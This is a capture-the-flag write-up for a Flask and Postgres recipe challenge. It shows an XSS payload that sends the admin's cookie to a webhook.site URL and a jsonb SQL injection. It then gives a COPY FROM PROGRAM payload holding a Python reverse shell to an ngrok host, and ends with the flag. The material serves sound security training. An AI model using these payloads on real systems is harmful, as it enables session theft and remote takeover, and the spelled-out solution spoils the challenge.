Judging from the session cookie pattern, it's a Flask application. There is an XSS in the ingredients field, and you can submit your recipe to the admin.

```
<img src=x onerror=fetch('https://webhook.site/d559bc0f-3038-48d0-8cda-6d7b229a19d4/?c='+btoa(document.cookie))>
```

![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-cookie.png)

Login with the admin's cookie and you get an admin panel. There is an SQL injection here.
However, the query is expecting type jsonb. 

![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-jsonb.png)


You can throw other errors to know it's postgres, then cast your column with `::jsonb`.
![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-postgres.png)

I got unintended solution for this, but there is a default config for Postgres 9.3 < 11.2 that allows you to execute commands using `COPY FROM PROGRAM`. I couldn't create my own tables so I used the existing cakes table. (img 4)

![alt text](/CTF-writeups/2025/brunnerctf-2025/images/cakearchitect-postgres-rce.png)

Payload to get shell on the box:
```
{"cake_id":"'5555'; COPY cakes FROM PROGRAM 'python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"0.tcp.ap.ngrok.io\",17769));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")''';-- -"}
```

Intended solution I believe is to enumerate enabled extensions and get RCE using `plpython3u`

This was in the challenge's init_db.sql
```
CREATE EXTENSION IF NOT EXISTS plpython3u;
```

Flag : `brunner{XSS_y0UR_w4y_T0_Pyth0N3_1N_P0sTgR35?!}`

Solved by: benkyou